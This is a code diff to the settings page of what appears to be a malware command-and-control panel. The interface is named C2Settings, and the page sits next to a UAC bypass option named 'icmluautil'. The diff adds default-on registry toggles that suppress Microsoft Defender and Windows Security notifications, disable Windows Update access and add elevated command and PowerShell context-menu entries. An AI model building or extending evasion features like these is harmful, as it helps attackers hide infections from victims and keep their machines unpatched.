@@ -115,6 +115,7 @@ interface C2Settings {
   registry?: {
     enabled: boolean;
     notificationsEnabled?: boolean;
+    actions?: Record<string, boolean>;
   };
 }
 
@@ -215,7 +216,24 @@ export function Settings() {
     },
     registry: {
       enabled: true,
-      notificationsEnabled: true
+      notificationsEnabled: true,
+      actions: {
+        policy_push_notifications: true,
+        policy_windows_update: true,
+        context_runas_cmd: true,
+        context_powershell_admin: true,
+        notify_center_hkcu: true,
+        notify_center_hklm: true,
+        defender_ux_suppress: true,
+        toast_global_above_lock: true,
+        toast_global_critical_above_lock: true,
+        toast_windows_update: true,
+        toast_security_maintenance: true,
+        toast_windows_security: true,
+        toast_sec_health_ui: true,
+        explorer_balloon_tips: true,
+        explorer_info_tip: true,
+      }
     }
   });
 
@@ -336,7 +354,24 @@ export function Settings() {
           },
           registry: {
             enabled: Boolean(data?.registry?.enabled ?? prev.registry?.enabled ?? true),
-            notificationsEnabled: Boolean(data?.registry?.notificationsEnabled ?? prev.registry?.notificationsEnabled ?? true)
+            notificationsEnabled: Boolean(data?.registry?.notificationsEnabled ?? prev.registry?.notificationsEnabled ?? true),
+            actions: {
+              policy_push_notifications: Boolean(data?.registry?.actions?.policy_push_notifications ?? prev.registry?.actions?.policy_push_notifications ?? true),
+              policy_windows_update: Boolean(data?.registry?.actions?.policy_windows_update ?? prev.registry?.actions?.policy_windows_update ?? true),
+              context_runas_cmd: Boolean(data?.registry?.actions?.context_runas_cmd ?? prev.registry?.actions?.context_runas_cmd ?? true),
+              context_powershell_admin: Boolean(data?.registry?.actions?.context_powershell_admin ?? prev.registry?.actions?.context_powershell_admin ?? true),
+              notify_center_hkcu: Boolean(data?.registry?.actions?.notify_center_hkcu ?? prev.registry?.actions?.notify_center_hkcu ?? true),
+              notify_center_hklm: Boolean(data?.registry?.actions?.notify_center_hklm ?? prev.registry?.actions?.notify_center_hklm ?? true),
+              defender_ux_suppress: Boolean(data?.registry?.actions?.defender_ux_suppress ?? prev.registry?.actions?.defender_ux_suppress ?? true),
+              toast_global_above_lock: Boolean(data?.registry?.actions?.toast_global_above_lock ?? prev.registry?.actions?.toast_global_above_lock ?? true),
+              toast_global_critical_above_lock: Boolean(data?.registry?.actions?.toast_global_critical_above_lock ?? prev.registry?.actions?.toast_global_critical_above_lock ?? true),
+              toast_windows_update: Boolean(data?.registry?.actions?.toast_windows_update ?? prev.registry?.actions?.toast_windows_update ?? true),
+              toast_security_maintenance: Boolean(data?.registry?.actions?.toast_security_maintenance ?? prev.registry?.actions?.toast_security_maintenance ?? true),
+              toast_windows_security: Boolean(data?.registry?.actions?.toast_windows_security ?? prev.registry?.actions?.toast_windows_security ?? true),
+              toast_sec_health_ui: Boolean(data?.registry?.actions?.toast_sec_health_ui ?? prev.registry?.actions?.toast_sec_health_ui ?? true),
+              explorer_balloon_tips: Boolean(data?.registry?.actions?.explorer_balloon_tips ?? prev.registry?.actions?.explorer_balloon_tips ?? true),
+              explorer_info_tip: Boolean(data?.registry?.actions?.explorer_info_tip ?? prev.registry?.actions?.explorer_info_tip ?? true),
+            }
           },
         }));
         try {
@@ -1372,6 +1407,117 @@ export function Settings() {
                       <Switch
                         checked={Boolean(settings.bypasses?.methods?.icmluautil)}
                         onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), icmluautil: checked })}
+                      />
+                    </div>
+                  </div>
+                </div>
+                <Separator />
+                <div className="space-y-2">
+                  <Label>Registry Actions</Label>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                    <div className="flex items-center justify-between">
+                      <span>Policy: Disable Toasts (HKCU)</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.policy_push_notifications)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), policy_push_notifications: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Policy: Disable Windows Update Access (HKLM)</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.policy_windows_update)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), policy_windows_update: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Context Menu: Runas CMD</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.context_runas_cmd)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), context_runas_cmd: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Context Menu: PowerShell Admin</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.context_powershell_admin)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), context_powershell_admin: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Notification Center (HKCU)</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.notify_center_hkcu)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), notify_center_hkcu: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Notification Center (HKLM)</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.notify_center_hklm)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), notify_center_hklm: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Defender UX Notification Suppress</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.defender_ux_suppress)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), defender_ux_suppress: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Global Toasts Above Lock</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_global_above_lock)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_global_above_lock: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Critical Toasts Above Lock</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_global_critical_above_lock)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_global_critical_above_lock: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Toast: Windows Update</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_windows_update)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_windows_update: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Toast: Security & Maintenance</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_security_maintenance)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_security_maintenance: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Toast: Windows Security</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_windows_security)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_windows_security: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Toast: SecHealth UI</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.toast_sec_health_ui)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), toast_sec_health_ui: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Explorer Balloon Tips</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.explorer_balloon_tips)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), explorer_balloon_tips: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>Explorer Info Tip</span>
+                      <Switch
+                        checked={Boolean(settings.registry?.actions?.explorer_info_tip)}
+                        onCheckedChange={(checked) => updateSetting('registry', 'actions', { ...(settings.registry?.actions || {}), explorer_info_tip: checked })}
                       />
                     </div>
                   </div>
